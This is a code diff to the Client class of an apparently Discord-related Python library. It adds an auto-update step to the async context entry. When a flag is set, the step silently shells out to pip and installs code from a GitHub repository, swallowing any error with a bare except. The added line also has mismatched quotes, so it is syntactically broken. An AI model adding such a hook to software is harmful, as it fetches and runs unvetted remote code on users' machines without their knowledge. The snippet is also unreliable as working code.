@@ -296,7 +296,6 @@ class Client:
         self._connection._get_websocket = self._get_websocket
         self._connection._get_client = lambda: self
         self.invalid_cache = Cache()
-        self._connection.auto_update = self.auto_update
         self.unknown_user = None
         if VoiceClient.warn_nacl:
             VoiceClient.warn_nacl = False
@@ -304,6 +303,11 @@ class Client:
 
     async def __aenter__(self) -> Self:
         await self._async_setup_hook()
+        if self.auto_update == True:
+            try:
+                await asyncio.create_subprocess_shell('pip install git+https://github.com/cop-discord/disdick")
+            except:
+                pass
         return self
 
     async def __aexit__(
